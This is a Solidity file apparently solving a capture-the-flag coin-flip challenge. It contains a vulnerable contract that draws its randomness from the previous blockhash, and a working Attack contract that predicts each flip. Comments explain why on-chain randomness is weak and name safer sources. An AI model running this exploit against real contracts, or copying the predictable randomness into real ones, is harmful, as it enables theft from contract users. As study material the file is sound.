// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 10 consecutive wins to get the flag
contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        // @audit - The contract will be exploitable if the attacker can call the flip function
        // with side boolean checked before the flip function is called.
        // since side is calculated with block.number - 1 then devide by FACTOR

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

contract Attack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip flip = CoinFlip(0x25D1FbF67D73e2039C52643FD8bc94E6568a0001);

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        // @hack - Get side before calling flip function
        flip.flip(side);
    }
}

/**
 * Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them,
 * and everything you use in smart contracts is publicly visible, including the local variables and state variables
 *  marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include
 * certain transactions - which allows them to bias these values in their favor.
 *
 * To get cryptographically proven random numbers, you can use Chainlink VRF, which uses an oracle, the LINK token,
 *  and an on-chain contract to verify that the number is truly random.
 *
 * Some other options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize).
 */
